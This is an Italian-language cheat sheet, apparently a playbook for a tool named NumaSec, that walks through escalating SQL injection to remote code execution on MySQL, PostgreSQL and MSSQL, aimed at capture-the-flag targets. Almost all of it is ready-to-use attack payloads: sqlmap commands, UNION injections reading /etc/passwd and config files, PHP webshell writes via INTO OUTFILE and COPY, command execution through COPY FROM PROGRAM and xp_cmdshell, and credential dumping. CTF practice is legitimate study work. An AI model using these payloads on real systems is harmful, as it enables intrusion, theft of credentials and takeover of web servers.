# Attack Chain: SQLi → RCE

Sequenza completa per escalare da SQL Injection a Remote Code Execution.

---

## 🔴 Quando Usare

- SQLi confermata (error-based o blind)
- Target: MySQL, PostgreSQL, MSSQL
- Obiettivo: Leggere file o eseguire comandi

---

## Phase 1: Confirm SQLi

```bash
# Con sqlmap
sqlmap -u "URL?param=value" --batch --dbs

# Manuale - Error based
' OR 1=1--
' UNION SELECT NULL,NULL--
```

**Cosa cercare**: Database names, error messages che confermano injection.

---

## Phase 2: Enumerate Privileges

```bash
# Controlla se user ha FILE privilege (MySQL)
sqlmap -u URL --privileges

# Oppure manuale
' UNION SELECT user,file_priv FROM mysql.user--
```

**Serve**: `FILE` privilege per leggere/scrivere file.

---

## Phase 3: Read Files (se FILE priv)

```bash
# Con sqlmap
sqlmap -u URL --file-read="/etc/passwd"
sqlmap -u URL --file-read="/var/www/html/config.php"

# Manuale MySQL
' UNION SELECT LOAD_FILE('/etc/passwd'),NULL--
' UNION SELECT LOAD_FILE('/flag.txt'),NULL--
```

**Obiettivo**: Leggere flag direttamente o trovare credenziali in config.

---

## Phase 4: Write Webshell (se FILE priv + write access)

```bash
# Con sqlmap
sqlmap -u URL --file-write=shell.php --file-dest=/var/www/html/shell.php

# Manuale MySQL
' UNION SELECT "<?php system($_GET['c']); ?>" INTO OUTFILE '/var/www/html/shell.php'--

# PostgreSQL
'; COPY (SELECT '<?php system($_GET["c"]); ?>') TO '/var/www/html/shell.php';--
```

**Poi accedi**: `http://target/shell.php?c=cat+/flag.txt`

---

## Phase 5: Direct Command Execution

### MySQL (UDF - User Defined Functions)
```bash
# Se puoi creare UDF
sqlmap -u URL --os-shell
```

### PostgreSQL
```sql
-- COPY command abuse
'; DROP TABLE IF EXISTS cmd_exec; CREATE TABLE cmd_exec(cmd_output text);--
'; COPY cmd_exec FROM PROGRAM 'cat /flag.txt';--
'; SELECT * FROM cmd_exec;--
```

### MSSQL
```sql
-- xp_cmdshell
'; EXEC xp_cmdshell 'cat /flag.txt';--

-- Se disabilitato, riabilitalo
'; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--
```

---

## Decision Tree

```
SQLi Confirmed?
├── YES → Check privileges
│   ├── FILE priv? → Read /flag.txt directly
│   ├── WRITE access? → Write webshell → RCE
│   └── No FILE? → Dump credentials → Login
└── NO → Try different injection points
```

---

## Tool Sequence (NumaSec)

1. `sqlmap --dbs` → Enumerate databases
2. `sqlmap --privileges` → Check FILE priv
3. `sqlmap --file-read=/flag.txt` → Direct read
4. Se fallisce: `sqlmap --dump -T users` → Get creds
5. Se creds: `submit` login form con creds estratte
